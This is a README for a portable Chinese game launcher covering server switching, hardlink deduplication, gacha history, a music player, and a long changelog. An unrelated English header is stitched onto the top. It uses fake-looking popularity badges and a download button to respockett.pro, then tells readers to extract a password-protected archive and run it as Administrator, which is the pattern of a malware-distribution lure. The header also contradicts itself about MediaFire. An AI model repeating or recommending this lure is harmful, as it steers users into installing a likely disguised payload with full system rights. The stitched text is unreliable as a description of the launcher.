<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## 它是什么

不是又一个「点击启动 exe」的壳。它解决的问题是：

- 一个游戏装了官服、B服、国际服三份客户端，硬盘被同样的资源吃掉三遍；
- 每次换服都要去翻不同的安装目录、不同的启动器；
- 抽卡记录散落在各种工具、导出文件和官方接口里，看不到统一视图。

花筱灵启动器把这三件事收进一个界面，并且**不往 C 盘写任何东西**——整个文件夹拷走就是完整搬家。

---

## 核心能力

### 多服务器与硬链接去重

同一个游戏可以同时挂官服 / B服 / 国际服（终末地还有 Play / Steam），当前服务器在启动页一眼可见，点一下就连切带启动。

当两个客户端在同一磁盘、且某些文件完全相同时，可以把它们合并成一份数据：

- 只处理**相对路径相同、大小相同、内容哈希相同**的文件；
- 不同文件、独有文件、存档一律不动；
- 支持「完整校验」（SHA-256）和「快速比较」（首尾各 1MB）两档；
- 合并后两边仍然从各自目录启动，互不影响。

> 跨盘会直接拒绝（Windows 硬链接限制）。更新前建议保留官方启动器兜底。

### 异环官服 / B服直切

异环不需要装两份客户端：启动器直接改写官方启动器的渠道配置完成切换，并按官方 CDN 清单把目标渠道缺的资源**提前下好**（只下缺的文件，已有的一律跳过）。切换、启动、退出全程不弹官方启动器，游戏退出后连托盘残留一起清理。

### 启动页

- **官方动态背景**：终末地取官网首屏视频，异环直接读本机官方启动器里的 `bg.mp4`；
- **自动去文字**：官方图常烧录标题，启动页会用「去字版本」做背景，静态图按网格检测文字块并用周边像素填补，视频则叠加定向遮罩带；两者都能和启动器自己的标题共存；
- **动图可暂停、可导出**：右下角两个按钮，暂停状态按游戏记忆，导出走「另存为」对话框；
- **服务器胶囊**：一行列出所有渠道，点击即切；右上角齿轮打开完整管理面板（重建、编辑、目录、清除、移除全在里面）；
- 窗口最小化 / 最大化 / 关闭按钮就在启动页右上角，不用退回主界面。

### 抽卡记录

五个游戏统一成同一套界面：总抽数等概览 KPI 下面，角色池 / 武器池 / 常驻池 / 邦布池分段铺成整面五星图墙，出金带「X 抽」垫数角标（欧金非红配色）、大立绘与日期；选中具体卡池时切换成该池的 KPI、垫数面板与全部记录。

数据来源：

| 游戏 | 来源 | 更新方式 |
|---|---|---|
| 原神 / 星铁 / 绝区零 | 本地抽卡数据库 / UIGF 导出 | 自动读取，也支持官方 webCache 增量同步 |
| 明日方舟：终末地 | 官方 `ef-webview` 接口 | 网页登录后自动从游戏日志取 Token，角色池 + 武器池一起拉 |
| 异环 | NTE_Gacha_Exporter 导出 JSON | 导入后自动补全名称与头像 |

**图鉴自动更新**：终末地角色名与立绘取自官网干员页、武器取自社区图鉴仓库（名称 + 图标按 ItemId 匹配），异环取自官网角色头像 + 社区名称表；缓存 24 小时，新版本上线后下次刷新就会带上新角色，不需要改代码。抓取失败一律回退旧缓存，抽卡页不会因为网络问题打不开。

### 点歌台

- 内置 NeteaseCloudMusicApi，首次使用自动在后台启动，无需手动装服务；
- 网易云扫码登录、歌单导入、关键词搜索、歌词同步、音质切换（标准 / 较高 / 极高 / 无损 / Hi-Res）；
- 四种播放模式：顺序、列表循环、单曲循环、随机；
- **3D 音效**：原声 / 宽阔声场 / 音乐厅 / 耳机 HRTF / 低音增强 / 人声清晰，强度可调；跨域音源会自动回退原声并提示；
- **弹幕点歌**：连上直播间后，弹幕发「点歌 歌名」自动搜索入队。B 站走官方 WebSocket；斗鱼、虎牙、抖音、快手、YY、网易CC、花椒、酷狗直播、小红书、淘宝直播、Twitch、YouTube 走后台隐藏窗口抓聊天区（视频流会被拦掉，不占带宽）；没适配过的站点还能用通用抓取试一把；
- 可拖动的迷你播放器，跨页面不中断播放。

### 官方公告

五款游戏的官网公告汇总成一张公告墙，每 10 分钟自动刷新，启动时后台预取，点开即跳官网。

### 其他

- **游戏库**：封面自定义、搜索、筛选、收藏、游玩时长统计；
- **下载管理器**：http/https 直链，断点续传、暂停、继续；
- **HoYo Sophon 差异更新**：按官方清单比对文件 MD5，硬链接复用已有文件，只下载缺失分块；
- **终末地渠道运行时**：用官服文件硬链接生成运行时，只覆盖少量渠道 SDK，不额外占体积；
- **星铁解锁帧率**：设置页直接切 30 / 60 / 120；
- **外观**：深色 / 浅色 / 跟随系统，四种强调色，自定义称呼与头像；
- **界面音效**：WebAudio 合成，无需资源文件；
- **公告页**、**动态页**、**下载页**、**设置页**各司其职。

---

## 完全便携

程序不在 C 盘留任何数据。所有内容都在启动器文件夹旁边：

```
花筱灵启动器\
├─ 花筱灵启动器.exe
├─ data\          ← 配置、登录会话、封面、背景视频、抽卡数据、缓存
├─ downloads\     ← 下载的游戏、更新包、导出的动图
└─ resources\     ← 程序资源（含内置网易云 API 与终末地渠道包）
```

- 如果放在不可写的位置（例如 `Program Files`），会自动退回系统 AppData，避免启动失败；
- 旧版本放在 `%APPDATA%\花筱灵启动器` 的数据会在首次运行时**自动迁移**过来，只搬配置、登录、封面和背景，缓存直接丢弃；
- 备份只需要拷 `data` 文件夹。

> 唯一的例外：终末地抽卡 Token 必须从游戏自己写的 `AppData\LocalLow\Hypergryph\Endfield\sdklogs\HGWebview.log` 读取，这是游戏的位置，只能读不能移。

---

## 上手

1. 解压 `HuaXiaoLing-2.4.2-Portable.zip`（或运行安装版 Setup.exe），整个文件夹放哪儿都行（建议非系统盘）；
2. 双击 `花筱灵启动器.exe`；
3. 内置游戏会自动扫描注册表和常见安装目录，没找到就在「启动页 → 齿轮 → 自动检测」或手动指定 exe；
4. 想加别的游戏，主页点「添加游戏」。

### 硬链接切换服务器的正确姿势

1. 分别安装好不同服务器的客户端，**不要装在同一个目录**；
2. 在启动页点服务器胶囊旁的齿轮 → 「管理服务器」→ 为每个客户端指定启动程序；
3. 关闭游戏和官方启动器，点「硬链接去重」；
4. 第一次建议用「完整校验」，确认文件一致后再合并；
5. 之后点服务器胶囊就能连切带启动。

### 终末地

- 渠道包已内置，官方发版时后台自动同步；
- 启动需要管理员权限，会在 `PlatformProcess.exe` 下以 `Games.exe` 父进程方式拉起，这样才会出现官方登录界面；
- B服 / 国际服 / Play / Steam 的差异运行时由启动器生成，原官服目录不会被修改。

---

## Windows 安全提示

便携包是**未签名**的 Electron 程序，SmartScreen / Defender 可能提示「未知发布者」或「对电脑有危害」。这不是因为包含恶意代码，而是没有代码签名证书、文件没有下载声誉。

**不要为了运行它而关闭系统安全防护。** 请先核对发布页提供的 SHA-256，确认来源可信，再选择「更多信息 → 仍要运行」。正式分发需要 OV / EV 代码签名证书。

---

## 已知限制

- **Sophon 更新**只做文件级覆盖与补齐，不处理官方清单里的删除项，也不重建被改名的文件；更新前建议保留官方启动器兜底。
- **硬链接**仅限同盘；官方启动器如果原地覆盖文件，可能同时影响两边。
- **原神 / 星铁 / 绝区零 抽卡**只读取本机已同步的数据库，不代替游戏登录。
- **异环抽卡**没有公开接口，只能导入 Exporter 导出的 JSON。
- **异环图鉴**只能匹配官网已公布的角色（约 19 位），未公布的会用首字兜底；武器图标取自社区图鉴仓库，个别刚上线的武器要等图鉴收录后自动补上。
- **终末地武器池**已接入同步，但界面暂未按武器类型分组。
- **弹幕点歌**：B 站最稳（官方协议）；斗鱼 / 虎牙 / 抖音 / 快手 等平台靠后台隐藏窗口读页面聊天区，平台改版或需要登录时可能抓不到，状态栏会如实说明。
- **无损音质**需要网易云会员，未登录通常返回 320kbps。
- **动态背景去文字**是基于亮度方差与边缘密度的启发式检测，不是 OCR，文字压在复杂背景上可能擦不干净。

---

## 开发

```powershell
npm install
npm start
```

打包（NSIS 安装包 + zip 便携包，输出到 `H:\HXL-pack\dist\`）：

```powershell
node H:\HXL-pack\pack.js
```

注意 asar 只包含 `electron/`、`src/`、图标和文档，**不包含** `resources/netease-api` 与 `resources/endfield-packs`，这两个运行时资源目录随发布包（便携 zip / 安装包）分发。

### 技术栈

- Electron 45，主进程 `electron/main.js`（约 1.1 万行），渲染层原生 HTML/CSS/JS，无框架无构建步骤；
- 渲染层通过 `preload.js` 暴露的 IPC 调用接口，开启 `contextIsolation` 与 `sandbox`；
- 领域模块：`link.js`（硬链接）、`runtime.js`（运行时）、`sophon.js`（差异更新）、`hdiff.js`（补丁）、`endfield-packs.js`（渠道包）、`endfield-launch.js`（管理员启动）、`endfield-gacha.js` / `gacha.js` / `gacha-import.js` / `gacha-sync.js` / `gacha-meta.js`（抽卡）、`neverness-channels.js` / `neverness-predownload.js`（异环渠道切换与资源直下）、`nte-tool.js`（导出工具获取）、`background-clean.js`（背景去字）、`starrail-fps.js`（注册表帧率）、`downloads.js`、`store.js`、`seed.js`。

测试钩子：`HX_SMOKE=1` 启动冒烟、`HX_CAPTURE=1` 生成页面截图、`HX_USER_DATA` 隔离数据目录。

---

## 更新日志

每次功能更新都会写进启动器内的「动态」页，最新条目排在最前面，欢迎指南仍然保留在其后。

<details open>
<summary><b>v2.4.2</b></summary>

**抽卡一面墙，异环随便切**

- **抽卡页全展开**：「查看全部」入口取消，总抽数等大数字下面，角色池 / 武器池 / 常驻池 / 邦布池分段铺满整面五星图墙——大立绘、抽数角标（欧金非红配色）、图下日期，一段一个池子。
- **异环官服 ↔ B 服一键互切**：逆向官方 CDN 分发体系，B 服资源由花筱灵按官方清单直接下载（只下缺的文件），全程不弹官方启动器；切回官服同理，提前下完官方链路就不再临时补几十 M。
- **异环启动直达**：跳过官方启动器主界面直接弹登录窗，登录窗上的「开始游戏」也帮忙自动点（界面认不出时自动放弃）；退出游戏自动把官方启动器和托盘残留一起退掉；游戏计时按进程 PID 精确监听。
- **异环抽卡导出工具一键获取**：导入弹窗里直接下载 NTE_Gacha_Exporter（连不上自动换加速镜像）、自动解压、打开文件夹。
- **异环服务器管理重做**：渠道改成卡片，点卡片即切，当前渠道高亮；「国服」统一为「官服」，老存档自动纠正。
- **终末地武器池补图**：接入社区图鉴（BoxCatTeam/endfield-cat-metadata），武器五星按 ItemId 匹配名称与图标，个别新武器等图鉴收录后自动补上。
- 修复异环误删启动器入口导致的 UE 报错弹窗、切服双重提示；崩坏3 启动页背景换成官方启动器同款无字大图；点歌台网易云歌单补全歌名封面、详情缓存、队列分段折叠加过滤。

</details>

<details>
<summary><b>展开版本历史</b>（v2.4.1 → v1.0.0）</summary>

<details>
<summary><b>v2.4.1</b></summary>

**点歌台全面提速，侧栏外扩，任务栏图标归位**

- **点歌台不再卡顿**：音源解析全部同时开跑、谁先出地址用谁，整轮 12 秒封顶（原来最坏干等一分多钟）；解析结果缓存 20 分钟。
- **音源自己说了算**：内置音源改成勾选开关（网易云、咪咕默认开，酷狗、QQ 需要时自己开）；新增「第三方音源」导入，JSON 描述或订阅链接一键接入。
- **会员歌兜底**：本地换源接口自动找可以完整播放的替代音源，只有试听片段的不算数。
- **启动页侧栏往外扩**：不再挤画面，窗口整体跟着扩；修好任务栏和托盘小图标认不出的问题。

</details>

<details>
<summary><b>v2.4.0</b></summary>

- **明日方舟完整接入**：自动探测本机客户端，官服、B 服、国际服（英/日/韩）与台服渠道切换，复用终末地那套渠道运行时；启动页背景用官方 PV 动态视频，公告直读鹰角官网。
- **崩坏3 完整接入**：官服 / B 服 / 国际服，公告与背景接入官方启动器内容接口，动态背景用官方同款 webm。
- 点歌台：酷狗歌单改走链接导入，导入的歌单自动进「我的歌单」；官服也能借 B 服生成硬链接；修好启动页模糊、遮罩与正在播放封面。

</details>

<details>
<summary><b>v2.3.0</b></summary>

**画质配置重做**

- **画质配置页全部中文化**：页面上不再出现注册表原始串。
- **每一项都能改**：开关两个按钮、档位下拉、数值输入框，改前备份旧值。
- **下拉和提示不再露原始数字**：只说「高」「已设为 DLSS」。
- **修掉三个卡死的问题**：画质选项全部不可用、下拉一点开就关掉、帧率只有「切换成功」没有可选档位。
- **终末地画质从 1.2 秒降到 4 毫秒**：配置全部缓存、后台静默刷新。
- **自动识别非米哈游游戏的画质位置**：找不到就明说，绝不猜。

</details>

<details>
<summary><b>v2.2.0</b></summary>


- 用户自定义插件上线：把 `.hxl` 单文件丢进 `data\plugins`，重启就能用，不用改程序本体，插件跟着 `data` 目录一起搬走。
- 插件跑在独立的 Worker 沙箱里，碰不到窗口、本地文件、账号 cookie 和启动器内部接口；权限写在 manifest 里，用之前在界面上逐项确认才会加载。
- 插件界面只给文字、列表、表格、进度条四种标准视图，样式跟着启动器走，写不好也只是样式普通，不会把主界面带白。
- 插件语法错、死循环超时、运行时崩了，都只记在这张插件卡片上，不会让整个启动器白屏。
- 动态页的几处显示问题、记录模型和弹幕也顺手修了一轮。

</details>

<details>
<summary><b>v2.1.9</b></summary>


- 官方更新源并进包里：装好就能自己检查更新，不用再到设置里填地址。想自己架服务器（局域网共享、对象存储都行）再填，填了就优先用你填的。
- ZIP 根目录自带一份 `latest.json`，跟着包一起发出去。它只写「真正的清单在哪」，不写下载地址和哈希——打包那一刻这个包自己的 sha256 还算不出来。
- 检查更新从「第一个读得通就用」改成「所有来源都读一遍、取版本最高的那份」：目录里留着上个版本的清单时，不会再一直显示「已是最新」。

</details>

<details>
<summary><b>v2.1.8</b></summary>


- 品牌标识放大到 38px，和侧栏收缩按钮一样大；顶栏小按钮、返回键跟着调整，都被拉回同一条中线上。
- 启动页「暂停动态图 / 存取动态图」两个小按钮常驻顶栏，没有官方动图的游戏下置灰提示，不再被挤出屏幕。
- 启动页点开小播放器，改成就地弹在当前位置附近，不再跳到主页。
- 全新安装第一次打开，主页称呼默认显示「主人」；已经用过的老用户保持自己原来的称呼。

</details>

<details>
<summary><b>v2.1.7</b></summary>


- 主页游戏库下面新增「后台双人卡」：左边花火、右边火花，各配一句台词，背景取她们的主色；窗口窄的时候自动叠成一列。
- 小按钮上的手绘小兔子换成四角火星纹样，颜色跟着按钮走，不再挡字。
- 立绘换成官方素材里的透明通道版本，不用再抠图。

</details>

<details>
<summary><b>v2.1.6</b></summary>


- QQ 音乐补上 `g_tk`（由 `qm_keyst` 用 hash33 算出来），QQ 号也去掉前导 0 再发出去；`musicu` 不再一律回 500003。
- 酷狗按它真正写的 cookie 名读：`t` / `KugooID` / `KuGoo` 三个来源谁有值用谁，不再永远提示「登录信息里没有酷狗用户 ID」。
- 读不到时，错误提示里会带上 cookie 名字和尾号（只露两位），把这句话发回来就能判断是登录过期还是名字又变了。

</details>

<details>
<summary><b>v2.1.5</b></summary>


- 歌单读不出来的根子是「登录窗口存下的 cookie 名字，和接口认的不是一套」，现在发请求前按平台把别名补齐，原来有的不动。
- 验证登录态改用真正要用的接口：QQ 打 `musicu` 的 `get_mine_playlist`，酷狗打移动站的「我的歌单」。
- 仍然失败时错误信息带上 cookie 名字和尾号，一眼看出是没登录还是名字对不上。

</details>

<details>
<summary><b>v2.1.4</b></summary>


- 有开关的设置行统一按标题行高对齐，不再对着「标题 + 说明段落」的中心飘；并排两个开关各占一半，各自贴着自己那一半的右边界。
- 点歌台的「开机继续播放」「小播放器」两个开关并成一行，和音量条、音质选择落在同一条竖线上。
- 酷狗账号歌单改走移动站「我的歌单」接口：不再要求登录态里必须有 userid，并对未登录时糊在 JSON 前的 `Access Deny !` 做了宽松解析。

</details>

<details>
<summary><b>v2.1.3</b></summary>


- 歌单读不到时直接给「重新登录」：QQ 音乐 500003、酷狗 Access Deny 会被认成登录过期，原委收进小抽屉。
- 扫码登录只存「真的登上了」的凭证：存盘前先用最轻的接口验一次，不再存半截 cookie。
- 硬链接安装前先报空间：窗口里新增「空间预估」，显示目标盘剩余、官服客户端体积、硬链接复用情况，换目标目录会立刻重算。
- 更新弹窗配图换成米游社画师作品，带作者和帖子链接；抓不到时自动退回官网美术图。

</details>

<details>
<summary><b>v2.1.2</b></summary>


- 小播放器展开后再点收起是原地缩回，不再往左上角跑；关掉之后来回点歌台也不会自己冒出来；设置页「音乐」里新加「显示小播放器」开关。
- 取歌单前会先从登录窗口重新读一遍凭据；酷狗登录后没写用户 ID 的情况，会用用户信息接口补回来。
- 报错文案改成中文，能直接看出是「没登录」「登录过期」还是「接口改版」。
- 启动页换游戏后恢复播放动态图；设置页改成左侧分组，不用一路往下滚了。

</details>

<details>
<summary><b>v2.1.1</b></summary>


- 启动页顶部那排按钮和主页小按钮统一改成「光轨」描边：一圈樱粉、紫藤、鎏金的光贴着边缘慢慢巡游，静止时也留一圈淡描边。
- 设置改成左侧分组、右侧只显示当前那一组，停在哪一组会被记住；窗口那一组也压短了，一屏能看完。
- 自动更新下载完成后自动退出主程序、接管更新流程，装完重新打开，不再卡在 100%；更新日志在设置页里能直接打开。
- 登录 QQ 音乐 / 酷狗之后会自己拉取账号歌单，歌单区不再重复放登录按钮；会员曲目走换源接口。

</details>

<details>
<summary><b>v2.1.0</b></summary>


- 弹幕点歌支持斗鱼、虎牙、抖音、快手，还有 YY、网易 CC、战旗：粘直播间链接，观众发「点歌 歌名」就自动排进队列，B 站保持原样。
- 网易云、QQ 音乐、酷狗登录一次，账号下的歌单就自己读出来，进「我的歌单」直接能看到。
- 我的歌单改成按平台分区的卡片墙，封面和曲目数一眼看清；点开可单首加入队列，也能一键全部加入。登录统一收进「账号」，这里不再重复放入口。
- 启动页右上角按钮重做观感；修掉抽屉封面被标题条压住、点服务器展开时动态图重新加载。
- 更新弹窗顶部固定放一张官方美术图，五款游戏各一张，来源写成官网链接。

</details>

<details>
<summary><b>v2.0.4</b></summary>


- 启动页抽屉里每一款游戏的封面完整露出来：标题条移到封面下方，不再盖在图片上，也不再有压暗的幕布挡图，整体更贴合主页的卡片气质。
- 设置页重新整理：不常用的功能收进折叠块，默认只露出常用项，页面短了很多。
- 更新公告回到「动态」页展示，这一版改了什么一眼就能看到。


---

MIT License

Copyright (c) 2026 HuaXiaoLing Studio

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
